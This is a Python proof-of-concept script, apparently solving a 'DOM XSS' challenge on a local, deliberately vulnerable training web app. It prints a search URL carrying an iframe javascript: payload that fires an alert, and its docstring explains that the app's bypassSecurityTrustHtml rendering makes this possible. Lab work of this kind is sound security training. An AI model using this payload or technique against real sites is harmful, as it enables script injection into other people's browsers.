#!/usr/bin/env python3
"""JUICE-003 - Reflected XSS via the search query (authorized, local only).

The search term from the URL is reflected into the results header and rendered with
Angular's bypassSecurityTrustHtml, so an <iframe javascript:> payload executes in the
browser. HTTP clients cannot run JS, so this script prints the exact URL to open; the
alert fires when the page loads (solves the "DOM XSS" challenge).

Usage:  python juice_003_reflected_xss.py [base_url]
        (default base_url: http://localhost:3000)
"""
import sys
from urllib.parse import quote
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
PAYLOAD = '<iframe src="javascript:alert(`xss`)">'


def main() -> int:
    # Confirm the app is up.
    r = requests.get(BASE, timeout=15)
    print(f"GET {BASE}  ->  HTTP {r.status_code}")
    if r.status_code != 200:
        print("Target not reachable.")
        return 1

    url = f"{BASE}/#/search?q={quote(PAYLOAD)}"
    print("Open this URL in a browser to fire the reflected XSS:")
    print(f"  {url}")
    print("Expected: an alert('xss') executes and the 'DOM XSS' challenge is solved.")
    print("JUICE-003 payload:", PAYLOAD)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
